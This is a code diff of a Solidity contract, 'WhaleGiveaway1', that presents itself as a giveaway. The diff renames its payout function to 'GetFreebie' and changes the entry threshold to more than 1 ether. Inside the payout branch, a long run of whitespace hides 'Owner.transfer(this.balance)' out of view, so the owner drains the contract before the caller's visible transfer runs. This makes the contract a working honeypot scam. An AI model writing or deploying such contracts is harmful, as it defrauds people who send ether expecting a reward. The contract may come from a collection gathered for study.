@@ -4,7 +4,6 @@ pragma solidity ^0.4.19;
 contract WhaleGiveaway1
 {
     address public Owner = msg.sender;
-    uint constant public minEligibility = 0.999001 ether;
 
     function()
     public
@@ -13,11 +12,11 @@ contract WhaleGiveaway1
 
     }
 
-    function redeem()
+    function GetFreebie()
     public
     payable
     {
-        if(msg.value>=minEligibility)
+        if(msg.value>1 ether)
         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
             msg.sender.transfer(this.balance);
         }
